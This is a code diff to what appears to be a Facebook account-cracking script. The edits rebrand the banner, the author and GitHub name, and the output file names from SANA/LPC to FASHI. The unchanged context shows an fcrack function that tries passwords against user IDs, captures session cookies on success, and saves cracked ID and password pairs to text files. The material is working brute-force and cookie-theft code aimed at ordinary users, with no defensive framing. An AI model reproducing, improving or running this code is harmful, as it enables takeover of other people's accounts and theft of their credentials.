@@ -1094,10 +1094,16 @@ logo = """
     \033[1;36m╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝    
                 \033[1;32m NOBITA\033[1;37m 
 --------------------------------------------------
-[•] AUTHOR     : \033[1;32mFAISAL\033[1;37m
+[•] AUTHOR     : \033[1;32mFAISAL GILL\033[1;37m
+[•] GITHUB     : \033[1;36mFashii007\033[1;37m
+[•] TOOL TYPE     : \033[1;35mRANDOM\033[1;37m
 [•] STATUS     : \033[1;32mFREE\033[1;37m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;36m 1.0 \033[1;37m\033[1;37m
+
+
+
+
 --------------------------------------------------"""
 
 def lines():
@@ -1141,7 +1147,7 @@ def rehan():
 	elif gh =='3':
 		chos()
 	elif gh =='4':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100012510726200')
+		os.system('xdg-open https://www.facebook.com/Nobita.hun.yawr786')
 	elif gh =='0':
 		print('[•] THANKS FOR USE ')
 		time.sleep(3)
@@ -1508,21 +1514,21 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SANA-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                open('LPC-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[FASHI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                open('FASHI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                # print('\033[1;33m[SANA-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('LPC-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                # print('\033[1;33m[FASHI-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('FASHI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mSANA\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mFASHI\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
